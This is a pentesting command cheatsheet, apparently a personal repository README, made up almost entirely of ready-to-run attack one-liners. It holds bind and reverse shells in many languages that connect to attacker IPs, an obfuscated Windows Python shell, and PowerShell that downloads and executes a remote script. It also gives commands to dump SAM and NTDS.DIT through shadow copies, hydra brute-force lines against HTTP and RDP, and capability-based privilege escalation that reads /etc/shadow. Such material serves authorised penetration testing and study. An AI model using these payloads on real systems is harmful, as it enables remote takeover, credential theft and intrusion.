# Cheatsheet
Command cheatsheet for Pentesting

## GENERAL:

	https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets#lfi
	
---------------------------------------------------------------------------------------------------
## SQL INJECTION:

	https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------------------------------------------------------------
## BIND SHELL:

	PYTHON:
		python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('172.20.1.12',80));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"

		python3 -c 'import socket as a; s = a.socket(); s.bind(("172.16.1.245",10101)); s.listen(1); (r,z) = s.accept(); exec(r.recv(999))'


	PERL:
		perl -e 'use Socket;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'

	PHP:
		php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'

---------------------------------------------------------------------------------------------------

## REVERSE SHELL:

	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

	BASH DEV/TCP:

		bash -i >& /dev/tcp/172.70.1.39/4040 0>&1

		0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

	SOCAT:

		user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
		user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

		user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

	Perl:

		perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

		perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

		Windows Only:

			perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'



	Python:

		export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

		Windows Only:
			
			C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

	PHP:

		php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

		php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
		
		php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'

		php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'

		php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'

		php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

		php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

	Ruby:

		ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

		ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

		Windows only:

			ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

	Golang:

		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

	Netcat Traditional:

		nc -e /bin/sh 10.0.0.1 4242

		nc -e /bin/bash 10.0.0.1 4242

		nc -c bash 10.0.0.1 4242

	Netcat OpenBSD:

		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

	OpenSSL:

		user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
		user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
		or
		user@attack$ ncat --ssl -vv -l -p 4242

		user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s

	Powershell:

		powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("172.70.1.39",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

		powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.70.1.39',4040);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

		powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

		powershell.exe -c -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("172.70.1.39",4040);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

	Awk:
		awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

	Java:

		r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.70.1.39/4040;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
		
	Lua:

		Linux Only:

			lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

		Windows or Linux:
			
			lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

	NodeJS:

		require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

		-var x = global.process.mainModule.require
		-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')	

---------------------------------------------------------------------------------------------------

## Upgrade to TTY shell - Python:

	python -c 'import pty; pty.spawn("/bin/bash")'

---------------------------------------------------------------------------------------------------

## Useful commands for Powershell

	Download files:

		certutil.exe -urlcache -f http://172.20.1.12/file.exe file.exe

	Find running processes:

		wmic service get Name,PathName,State | findstr "Running" | findstr "Program"

	Create shadow copy to access SAM, NTDS.DIT and SYSTEM files:

		vssadmin create shadow /for=c:

		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit

		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\system

		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam


---------------------------------------------------------------------------------------------------


## Useful commands for Enumeration:

	RPC:	

		rpcinfo 172.16.1.1

		rpcclient -U "" -N 172.16.1.1


	NFS:
		showmount -e 172.16.1.1

		mount -t nfs -o nfsvers=2 172.16.1.195:/opt/utils /tmp/nfs

	SMB:

		smbclient -L \\172.16.1.1 -N 

		smbclient -L \\172.16.1.1 -N --option='client min protocol=NT1'

		smbclient 172.16.1.1//IPC$ 

		smbclient -L \\172.16.1.1 -U "administrador"
		
	LINUX SUID/GUID:

		find / -perm /4000 2>/dev/null
		
		find / -perm /2000 2>/dev/null
		
		./bin/bash -p

	LINUX Capabilities:

		getcap -r / 2>/dev/null		

---------------------------------------------------------------------------------------------------

## Useful general commands on Linux systems:



	Brute force HTTP Example:

		hydra -F -V -l userName -P /usr/share/wordlists/rockyou.txt 172.16.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&User=^USER^&Password=^PASS^:incorrectly."

	Brute Force RDP:

		hydra -V -F -L lista -P lista rdp://172.16.1.188

	Python FTP Server:

		python -m pyftpdlib -p 21 -w

	Python HTTP Server:

		python -m SimpleHTTPServer 80

	Tunneling  - Socat:

		Target:
			
			./socat TCP4:172.20.1.12:8443 TCP4:0.0.0.0:222

		Attacker:
		
			socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:222,reuseaddr

	Portscan without NMAP:

		for port in {1..65535}; do 2> /dev/null echo >/dev/tcp/172.19.0.2/$port && echo "port $port open"; done

	Ping Sweep without NMAP (slow):

		for i in $(seq 1 255); do echo $(ping -c 1 172.17.0.$i) | grep "64 bytes" | cut -d " " -f 2; done
	
	Exploiting capabilities for Privilege Escalation:
	
		Python:

			./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

		Perl:

			./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

		Tar:

			cp /bin/tar /home/demo/
			setcap cap_dac_read_search+ep /home/demo/tar
			./tar cvf shadow.tar /etc/shadow
			ls
			./tar -xvf shadow.tar
			tail -8 etc/shadow
